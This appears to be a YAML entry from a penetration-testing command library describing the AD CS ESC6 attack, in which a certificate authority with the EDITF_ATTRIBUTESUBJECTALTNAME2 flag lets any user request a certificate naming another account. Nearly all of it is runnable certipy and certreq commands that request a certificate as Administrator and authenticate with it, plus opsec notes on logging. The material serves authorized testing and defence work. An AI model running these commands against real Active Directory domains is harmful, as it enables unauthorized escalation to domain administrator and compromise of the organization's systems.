name: ADCSESC6
description: ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled on CA
commands:
- '# Check if CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled'
- certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP>
- ''
- '# Request certificate specifying SAN (any user)'
- certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -target '<CA_HOST>' -template User -upn Administrator@<DOMAIN>
- ''
- '# Authenticate as Administrator'
- certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
- ''
- '# Alternative: Using certreq (Windows)'
- certreq -submit -attrib "SAN:upn=Administrator@<DOMAIN>" request.req
opsec:
- This flag should not be enabled in production
- Certificate requests with SAN are logged
references:
- https://posts.specterops.io/certified-pre-owned-d95910965cd2
